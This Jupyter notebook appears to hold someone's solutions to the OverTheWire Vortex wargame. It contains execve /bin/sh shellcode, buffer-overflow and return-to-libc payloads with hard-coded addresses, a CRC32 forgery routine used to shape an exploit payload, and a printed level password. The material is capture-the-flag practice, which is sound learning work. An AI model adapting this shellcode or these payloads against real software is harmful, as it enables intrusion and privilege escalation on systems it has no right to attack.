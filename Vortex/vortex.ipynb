{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Vortex Level 0 → Level 1 <br/>\n",
    "\n",
    "https://overthewire.org/wargames/vortex/vortex0.html\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xad\\xad\\xf6\\x15'\n",
      "b'+\\xa9\\xe8='\n",
      "b'\\x02\\xc8\\xb7b'\n",
      "b'HI\\x05\\x00'\n",
      "b'Username: vortex1 Password: Gq#qu3bF3'\n"
     ]
    }
   ],
   "source": [
    "import socket\n",
    "import struct\n",
    "\n",
    "HOST = \"vortex.labs.overthewire.org\"\n",
    "PORT = 5842\n",
    "\n",
    "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "    s.connect((HOST, PORT))\n",
    "\n",
    "    result = 0\n",
    "    for i in range(0, 4):\n",
    "        data = s.recv(4)\n",
    "        print(data)\n",
    "        result += int.from_bytes(data, \"little\")\n",
    "        # s.sendall(data)\n",
    "\n",
    "    s.sendall(struct.pack(\"<I\", result))\n",
    "    data = s.recv(1024)\n",
    "    print(data)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Vortex Level 1 → Level 2\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "889192448"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0xFFFFFFFF - 0xCAFFFFFF"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Vortex Level 2 → Level 3\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "34"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(\n",
    "    b\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\"\n",
    ")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Vortex Level 3 → Level 4\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "132"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(\n",
    "    b\"\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\"\n",
    "    + b\"A\" * 98\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4294957897"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0xFFFFDB49"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "623800357"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x252E7025"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4157313110"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0xF7CB9056"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4222783574"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0xFBB29056"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "-9398"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0xDB49 - 0xFFFF"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Vortex Level 7 → Level 8\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python\n",
    "from struct import pack\n",
    "import binascii\n",
    "\n",
    "# Poly in \"reversed\" notation -- http://en.wikipedia.org/wiki/Cyclic_redundancy_check\n",
    "POLY = 0xEDB88320  # CRC-32-IEEE 802.3\n",
    "# POLY = 0x82F63B78 # CRC-32C (Castagnoli)\n",
    "# POLY = 0xEB31D82E # CRC-32K (Koopman)\n",
    "# POLY = 0xD5828281 # CRC-32Q\n",
    "\n",
    "\n",
    "def build_crc_tables():\n",
    "    for i in range(256):\n",
    "        fwd = i\n",
    "        rev = i << 24\n",
    "        for j in range(8, 0, -1):\n",
    "            # build normal table\n",
    "            if (fwd & 1) == 1:\n",
    "                fwd = (fwd >> 1) ^ POLY\n",
    "            else:\n",
    "                fwd >>= 1\n",
    "            crc32_table[i] = fwd & 0xFFFFFFFF\n",
    "            # build reverse table =)\n",
    "            if rev & 0x80000000 == 0x80000000:\n",
    "                rev = ((rev ^ POLY) << 1) | 1\n",
    "            else:\n",
    "                rev <<= 1\n",
    "            rev &= 0xFFFFFFFF\n",
    "            crc32_reverse[i] = rev\n",
    "\n",
    "\n",
    "crc32_table, crc32_reverse = [0] * 256, [0] * 256\n",
    "build_crc_tables()\n",
    "\n",
    "seed = 0x0\n",
    "\n",
    "\n",
    "def crc32(s):  # same crc32 as in (binascii.crc32)&0xffffffff\n",
    "    crc = seed\n",
    "    for c in s:\n",
    "        crc = (crc >> 8) ^ crc32_table[(crc ^ c) & 0xFF]\n",
    "    return crc ^ seed\n",
    "\n",
    "\n",
    "def forge(wanted_crc, str, pos=None):\n",
    "    if pos is None:\n",
    "        pos = len(str)\n",
    "\n",
    "    # forward calculation of CRC up to pos, sets current forward CRC state\n",
    "    fwd_crc = seed\n",
    "    for c in str[:pos]:\n",
    "        fwd_crc = (fwd_crc >> 8) ^ crc32_table[(fwd_crc ^ c) & 0xFF]\n",
    "\n",
    "    # backward calculation of CRC up to pos, sets wanted backward CRC state\n",
    "    bkd_crc = wanted_crc ^ seed\n",
    "    for c in str[pos:][::-1]:\n",
    "        bkd_crc = ((bkd_crc << 8) & 0xFFFFFFFF) ^ crc32_reverse[bkd_crc >> 24] ^ c\n",
    "\n",
    "    # deduce the 4 bytes we need to insert\n",
    "    for c in pack(\"<L\", fwd_crc)[::-1]:\n",
    "        bkd_crc = ((bkd_crc << 8) & 0xFFFFFFFF) ^ crc32_reverse[bkd_crc >> 24] ^ c\n",
    "\n",
    "    res = str[:pos] + pack(\"<L\", bkd_crc) + str[pos:]\n",
    "    assert binascii.crc32(res, 0xFFFFFFFF) ^ 0xFFFFFFFF == wanted_crc\n",
    "    # assert crc32(res) == wanted_crc\n",
    "    return res"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hex(check) = 0xe1ca95ee\n",
      "wanted_crc = 0xe1ca95ee\n",
      "payload = b'aa\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xdf\\xdc\\xff\\xff\\xc7\\xec\\x90\\xa7'\n"
     ]
    }
   ],
   "source": [
    "EGG2_ADDRESS = 0xFFFFDCDF\n",
    "\n",
    "wanted_crc = 0xE1CA95EE\n",
    "payload = forge(\n",
    "    wanted_crc,\n",
    "    b\"a\" * 2 + struct.pack(\"<I\", EGG2_ADDRESS) * 16,\n",
    ")\n",
    "\n",
    "check = binascii.crc32(payload, 0xFFFFFFFF) ^ 0xFFFFFFFF\n",
    "print(f\"hex(check) = {hex(check)}\")\n",
    "print(f\"wanted_crc = {hex(wanted_crc)}\")\n",
    "print(f\"payload = {payload}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Vortex Level 8 → Level 9\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\xb9\\x0c\\xa0\\x04\\x08\\xbbw\\xdd\\xff\\xff\\x89\\x19'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "bytes.fromhex(\"b90ca00408bb77ddffff8919\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "12"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(b\"\\xb9\\x0c\\xa0\\x04\\x08\\xbbw\\xdd\\xff\\xff\\x89\\x19\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Vortex Level 10 → Level 11\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x804cfdc'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "hex(0x0804D01C - 0x40)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "2048"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "0x800"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Vortex Level 12 → Level 13\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@\\xfe\\xe5\\xf7\\x90\\x90\\x90\\x90\\xeb\\xdd\\xff\\xff/bin/sh\\x00@\\xfe\\xe5\\xf7\\x00\\x00\\x00\\x00'\n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "import struct\n",
    "\n",
    "padding = b\"A\" * 1036\n",
    "exec_addr = struct.pack(\"<I\", 0xF7E5FE40)\n",
    "argv_array = struct.pack(\"<II\", 0xF7E5FE40, 0)\n",
    "egg_addr = struct.pack(\"<I\", 0xFFFFDDEB)\n",
    "\n",
    "sys.stdout.buffer.write(\n",
    "    padding + exec_addr + b\"\\x90\" * 4 + egg_addr + b\"/bin/sh\\x00\" + argv_array\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'sh\\x00\\xf7'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "struct.pack(\"<I\", 0xF7006873)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
